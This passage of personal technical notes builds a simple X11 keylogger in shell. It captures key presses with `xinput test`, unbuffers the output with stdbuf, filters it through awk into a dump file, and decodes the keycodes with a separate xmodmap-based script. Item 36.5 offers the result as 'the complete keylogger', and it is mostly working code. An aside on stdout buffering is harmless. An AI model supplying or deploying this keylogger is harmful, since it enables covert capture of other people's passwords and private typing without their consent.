33. Simple sketch of keylogger:
 
 Identify your keyboard id with: xinput --list
 
 Log keystrokes with: `xinput --test $id`
 (Observation: instead of --test, --test-xi2 is working. And for minimal output, id=12 is good)
 
 Match numbers to keys with: xmodmap -pke
 
 
 Dumping this output to a file seems to be a challenging task since the command gives an output after we hit Ctrl+C. So, the doing >>dumpfile dumps a chunk of data instead of line per event. In fact, if we use --test, it doesn't even dump. To avoid this, we use:
 stdbuf -o0 xinput test 12 > logfile
 
 Read:
 
35. Dumping stdout without buffering:
 
 You can explicitly set the buffering options of the standard streams using a setvbuf call in C (see this link), but if you're trying to modify the behaviour of an existing program try stdbuf (part of coreutils starting with version 7.5 apparently).
 
 This buffers stdout up to a line:
 
 stdbuf -oL command > output
 
 This disables stdout buffering altogether:
 
 stdbuf -o0 command > output
 
 
36. Using awk to reformat the output:
``
 stdbuf -o0 xinput test 12 | awk -F' ' '{printf $3}'
``

This means, consider the lines of the output as a sequence divided by the character ' '. Then print the 3rd element of that sequence.
 
36.5. so, here is the complete keylogger:
 
 # The dumping part of the keylogger. A file called mykeylogger
```
 stdbuf -o0 xinput test 11 | stdbuf -o0 awk '/ press /' | stdbuf -o0 awk -F' ' '{print $3}' >> dump 
``` 

 # The decoding part of it. A different file called decode.sh
 
``` 
 for line in $(cat dump)
 do
 	xpr="$(xmodmap -pke | awk "NR==$line-7" | awk '{ print $4}')"
 #	echo $xpr
 	case "$xpr" in
 		Return)
 			echo -e "\n" >> out2
 			;;
 		space)
 			echo " " >> out2
 			;;
 		*)
 			echo -n $xpr >> out2
 	esac
 	echo -n " " >> out2 
 done  
 echo -e "\n" >> out2
 cat out2
```
 
